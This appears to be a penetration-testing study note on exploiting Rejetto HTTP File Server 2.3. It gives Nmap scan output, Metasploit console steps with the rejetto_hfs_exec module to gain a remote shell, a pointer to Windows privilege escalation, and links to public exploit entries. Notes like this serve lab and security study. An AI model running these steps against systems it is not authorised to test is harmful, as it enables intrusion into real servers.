##### ***What is HFS?***
HFS (HTTP File Server) is an open source file system designed to run on a web server for publishing and sharing files. It operates at Layer 7.
##### ***Exploiting HFS***
###### **Metasploit exploit for Rejetto HTTP File Server HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8**
Running a simple Nmap scan and it reveals that port 8080 is open running an HTTPD web server:
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

You can use metasploit to exploit the target web server and gain a shell:
```
msfconsole
msf > use exploit/windows/http/rejetto_hfs_exec
msf exploit(rejetto_hfs_exec) > show targets
    ...targets...
msf exploit(rejetto_hfs_exec) > set TARGET < target-id >
msf exploit(rejetto_hfs_exec) > show options
    ...show and set options...
msf exploit(rejetto_hfs_exec) > exploit
```

After getting a shell into the machine, we can try privilege escalation with [[Windows privilege escalation using PowerUp.ps1 script to check for misconfigurations]]
##### ***Resources***
[Metasploit RCE](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)
[ExploitDB Python RCE](https://www.exploit-db.com/exploits/39161)